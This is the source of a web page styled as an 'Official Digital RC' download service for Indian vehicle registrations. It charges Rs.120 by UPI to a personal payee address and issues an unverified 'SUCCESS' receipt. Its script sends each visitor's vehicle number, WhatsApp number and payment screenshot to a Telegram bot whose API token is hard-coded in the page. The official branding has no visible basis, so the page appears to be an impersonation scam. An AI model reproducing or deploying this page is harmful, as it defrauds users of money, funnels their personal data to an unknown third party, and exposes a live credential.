<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RCPDF.IN - Official Digital RC</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
    <style>
        :root { --primary: #ff0066; --ind-blue: #003399; }
        * { margin:0; padding:0; box-sizing:border-box; font-family: 'Arial', sans-serif; }
        body { background: #000; color: #fff; overflow-x: hidden; }

        /* Header */
        .header { position: fixed; top: 0; width: 100%; background: #fff; padding: 12px 20px; display: flex; justify-content: space-between; align-items: center; z-index: 1000; height: 60px; border-bottom: 2px solid var(--primary); }
        .menu-btn { cursor: pointer; display: flex; flex-direction: column; gap: 4px; width: 28px; }
        .menu-btn div { width: 100%; height: 3px; background: var(--primary); border-radius: 2px; }
        .logo { color: var(--primary); font-weight: 900; font-size: 22px; text-decoration: none; }

        /* Sidebar */
        .sidebar { position: fixed; top: 0; left: -280px; width: 260px; height: 100%; background: #fff; transition: 0.4s; z-index: 2000; padding: 80px 20px; color: #333; }
        .sidebar.active { left: 0; }
        .s-link { display: block; width: 100%; padding: 14px; margin-bottom: 12px; background: #f0f0f0; border-radius: 8px; text-decoration: none; color: #333; font-weight: bold; text-align: center; border:none; cursor:pointer; }

        /* Card */
        .card { margin: 120px auto 20px; width: 92%; max-width: 420px; background: #1a1a1c; padding: 30px 20px; border-radius: 25px; text-align: center; border: 1px solid #333; }

        /* BIG IND PLATE */
        .hsrp-plate { 
            background: #fff; width: 100%; height: 80px; 
            border: 2px solid #555; border-radius: 12px; 
            display: flex; align-items: center; overflow: hidden; margin-bottom: 15px; 
        }
        .ind-strip { 
            background: var(--ind-blue); width: 75px; height: 100%; 
            display: flex; flex-direction: column; align-items: center; justify-content: center; color: #fff; 
            flex-shrink: 0;
        }
        .ind-strip img { width: 32px; margin-bottom: 4px; }
        .ind-strip span { font-size: 18px; font-weight: 900; }

        #vehInput { flex: 1; border: none; height: 100%; font-size: 28px; font-weight: 900; text-align: center; color: #000; outline: none; background: transparent; width: 100%; }
        #vehInput::placeholder { color: #bbb; text-align: center; opacity: 0.6; }

        .btn { width: 100%; padding: 18px; border-radius: 12px; border: none; background: var(--primary); color: #fff; font-size: 18px; font-weight: bold; cursor: pointer; box-shadow: 0 4px 0 #b30047; margin-top: 10px; }

        /* RGB NEON BUTTON - FAST MOVE */
        .neon-btn {
            position: relative; background: #000; color: #fff; font-size: 22px; font-weight: 900;
            padding: 20px; width: 100%; border-radius: 15px; border: none; cursor: pointer;
            text-transform: uppercase; margin-bottom: 25px; overflow: hidden; display: flex;
            align-items: center; justify-content: center; transition: 0.2s;
        }
        .neon-btn::before {
            content: ''; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%;
            background: conic-gradient(#ff0000, #ff7300, #fffb00, #48ff00, #00ffd5, #002bff, #7a00ff, #ff00c8, #ff0000);
            animation: rotateRGB 1.5s linear infinite;
        }
        .neon-btn::after {
            content: 'PAYMENT WITH UPI ❤️'; position: absolute; inset: 4px; background: #000;
            border-radius: 12px; display: flex; align-items: center; justify-content: center; color: #fff; z-index: 1;
        }
        @keyframes rotateRGB { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }

        #mob { width: 100%; padding: 16px; border-radius: 12px; border: none; margin-bottom: 12px; background: #2c2c2e; color: #fff; font-size: 16px; text-align: center; }

        /* Loader */
        .loader-wrap { position: fixed; inset: 0; background: #000; z-index: 5000; display: none; flex-direction: column; justify-content: center; align-items: center; }
        .road { width: 85%; height: 4px; background: #333; position: relative; }
        .car { font-size: 45px; position: absolute; bottom: 0; left: 0; transform: scaleX(-1); transition: 0.1s linear; }
        .pct { font-size: 45px; font-weight: 900; color: var(--primary); margin-top: 25px; }

        .footer { margin-top: 30px; font-size: 11px; opacity: 0.5; text-align: center; padding-bottom: 20px; }
    </style>
</head>
<body oncontextmenu="return false;">

    <div class="header">
        <div class="menu-btn" onclick="toggleM()"><div></div><div></div><div></div></div>
        <b class="logo">RCPDF.IN</b>
        <button style="background:none; border:none; font-size:24px;" onclick="location.reload()">🏠</button>
    </div>

    <div class="sidebar" id="side">
        <button class="s-link" onclick="window.location.href='https://insurancebju.blogspot.com/2025/11/blog-post_17.html?m=1'">Insurance</button>
        <button class="s-link" onclick="toggleM()">Close Menu</button>
    </div>

    <div class="card">
        <div id="p1">
            <h2 style="margin-bottom:20px;">Download Digital RC</h2>
            <div class="hsrp-plate">
                <div class="ind-strip"><img src="https://upload.wikimedia.org/wikipedia/commons/4/41/Flag_of_India.svg"><span>IND</span></div>
                <input type="text" id="vehInput" placeholder="BR-09-AB-1234" maxlength="13" oninput="formatV(this)">
            </div>
            <button class="btn" onclick="go2()">CONTINUE</button>
        </div>

        <div id="p2" style="display:none;">
            <button class="neon-btn" onclick="pay()"></button>
            <div style="background:#fff; padding:12px; border-radius:15px; display:inline-block; margin-bottom:15px; border:1px solid #ddd;">
                <img id="qr" src="" width="180">
                <p style="color:#000; font-size:10px; margin-top:5px; font-weight:bold;">SCAN QR TO PAY</p>
            </div>
            <input type="tel" id="mob" placeholder="WhatsApp Number" maxlength="10">
            <input type="file" id="ss" style="margin-bottom:15px; font-size:12px; color:#aaa; width:100%;">
            <button class="btn" onclick="submit()">Verify & Download PDF</button>
        </div>
    </div>

    <div class="footer">© 2026 RCPDF.IN | Official Digital Services</div>

    <div class="loader-wrap" id="load">
        <div class="road"><div class="car" id="carIcon">🚗</div></div>
        <div class="pct" id="pText">0%</div>
        <p style="color:#666;">Generating PDF Receipt...</p>
    </div>

    <script>
        function toggleM() { document.getElementById('side').classList.toggle('active'); }

        function formatV(i) {
            let v = i.value.toUpperCase().replace(/[^A-Z0-9]/g, '');
            let out = "";
            if (v.length > 0) out += v.substring(0, 2);
            if (v.length > 2) out += "-" + v.substring(2, 4);
            if (v.length > 4) out += "-" + v.substring(4, 6);
            if (v.length > 6) out += "-" + v.substring(6, 10);
            i.value = out;
        }

        function go2() {
            if(document.getElementById('vehInput').value.length < 9) { alert("कृपया गाड़ी का सही नंबर डालें!"); return; }
            const upi = "upi://pay?pa=8709610091@okbizaxis&pn=RCPDF&am=120.00&cu=INR&tn=RC%20DOWNLOAD";
            document.getElementById('qr').src = "https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=" + encodeURIComponent(upi);
            document.getElementById('p1').style.display='none';
            document.getElementById('p2').style.display='block';
        }

        function pay() { window.location.href="upi://pay?pa=8709610091@okbizaxis&pn=RCPDF&am=120.00&cu=INR&tn=RC%20DOWNLOAD"; }

        function submit() {
            const m = document.getElementById('mob').value;
            const s = document.getElementById('ss').files[0];
            
            // Blank check validation
            if(m.length < 10) { alert("कृपया अपना 10 अंकों का WhatsApp नंबर डालें!"); return; }
            if(!s) { alert("कृपया पेमेंट का स्क्रीनशॉट अपलोड करें!"); return; }

            document.getElementById('load').style.display='flex';
            let p = 0;
            let iv = setInterval(() => {
                p += 2;
                document.getElementById('pText').innerText = p + "%";
                document.getElementById('carIcon').style.left = (p * 0.88) + "%";
                if(p >= 100) {
                    clearInterval(iv);
                    makePDF();
                    sendT(s);
                }
            }, 60);
        }

        function makePDF() {
            const { jsPDF } = window.jspdf;
            const doc = new jsPDF();
            const v = document.getElementById('vehInput').value;
            const m = document.getElementById('mob').value;

            // Simple Box Layout PDF (10:36 PM version)
            doc.setDrawColor(0); doc.rect(5, 5, 200, 287);
            doc.setFillColor(0, 51, 153); doc.rect(5, 5, 200, 30, 'F');
            doc.setTextColor(255); doc.setFontSize(22); doc.text("RCPDF.IN - RECEIPT", 105, 25, null, null, "center");
            
            doc.setTextColor(0); doc.setFontSize(14);
            doc.text(`VEHICLE NO: ${v}`, 20, 50);
            doc.text(`WHATSAPP NO: ${m}`, 20, 60);
            doc.text(`PAID AMOUNT: Rs.120.00`, 20, 70);
            doc.text(`STATUS: SUCCESS`, 20, 80);
            
            doc.setFontSize(10); doc.text("1. Original RC PDF will be sent on WhatsApp in 30-60 mins.", 20, 110);
            doc.text("2. Payment is non-refundable.", 20, 116);
            doc.save(`Receipt_${v}.pdf`);
            location.reload();
        }

        function sendT(f) {
            let fd = new FormData();
            fd.append("chat_id", "5600045707");
            fd.append("photo", f);
            let msg = `🚀 NEW RC ORDER\n🚗 Veh: ${document.getElementById('vehInput').value}\n📱 Mob: ${document.getElementById('mob').value}`;
            fd.append("caption", msg);
            
            // 10:36 PM wala working fetch call
            fetch("https://api.telegram.org/bot8138238341:AAFlgSY3OGo5oOfa-IbZ9DxdgrmAeVE525E/sendPhoto", {
                method: "POST", 
                body: fd
            });
        }
    </script>
</body>
</html>
